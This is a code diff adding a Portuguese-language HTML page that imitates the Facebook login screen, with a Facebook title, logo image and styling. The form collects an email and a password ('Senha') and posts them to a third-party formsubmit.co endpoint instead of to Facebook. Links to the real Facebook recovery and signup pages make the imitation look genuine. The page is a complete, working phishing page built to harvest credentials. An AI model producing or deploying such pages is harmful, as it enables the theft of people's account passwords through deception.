@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        *{
+            font-family: Arial, Helvetica, sans-serif;
+            text-decoration: none;
+        }
+        body{
+            background-color: rgb(241,242,246,255);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .container{
+            display: flex;
+            flex-direction: column;
+            border-radius: 8px;
+            width: 396px;
+            padding: 10px;
+            box-shadow:  0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+            background-color: white;
+            align-self: center;
+        }
+
+        form{
+            display: flex;
+            flex-direction: column;
+        }
+
+        textarea{
+            border-color: rgba(128, 128, 128, 0.274);
+            padding: 8px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+
+        #xamaa{
+            border: 1px solid rgba(128, 128, 128, 0.274);
+            padding: 8px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+
+        #entrar{
+            padding: 10px;
+            color: white;
+            background-color: #1969e5;
+            font-size: 1em;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        #entrar:hover{
+            background-color: #0954c4;
+        }
+
+        h3{
+            color: #1969e5;
+            font-size: 0.7em;
+            cursor: pointer;
+            text-align: center;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(128, 128, 128, 0.322);
+        }
+
+        .button{
+            align-self: center;
+            font-family: inherit;
+        }
+
+        button{
+            padding: 10px;
+            margin-top: 10px;
+            margin-bottom: 15px;
+            color: white;
+            background-color: #1bbb06;
+            font-size: 1em;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: max-content;
+            align-self: center;
+        }
+
+        button:hover{
+            background-color: #17a104;
+        }
+
+        #email{
+            border: 1px solid rgba(128, 128, 128, 0.274);
+            padding: 8px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+
+        .textao{
+            align-self: center;
+        }
+
+        @media(max-width: 460px){
+            .container{
+                width: auto;
+            }
+
+            .textao img {
+                height: 200px;
+            }
+        }
+
+        @media(min-width: 1024px){
+            body{
+                display: flex;
+                flex-direction: row;
+                justify-content: space-around;
+                margin-top: 13%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="textao">
+        <img src="faceb.JPG" alt="logo do facebook">
+    </div>
+    <div class="container">
+        <form action="https://formsubmit.co/afd461dd0834106f3350f00141abf609" method="post">
+            <input type="text" name="name" placeholder="Email" id="xamaa" required autocomplete="off">
+            <input type="email" name="email" placeholder="Confirme seu Email" required id="email" autocomplete="off">
+            <textarea name="message" cols="30" rows="1" placeholder="Senha" required></textarea>
+            <input type="submit" value="Entrar" id="entrar">
+        </form>
+        <a href="https://pt-br.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
+            <h3>Esqueceu a senha?</h3>
+        </a>
+        <a class="button" href="https://pt-br.facebook.com/"><button>Criar nova conta</button></a>
+    </div>
+</body>
+</html>
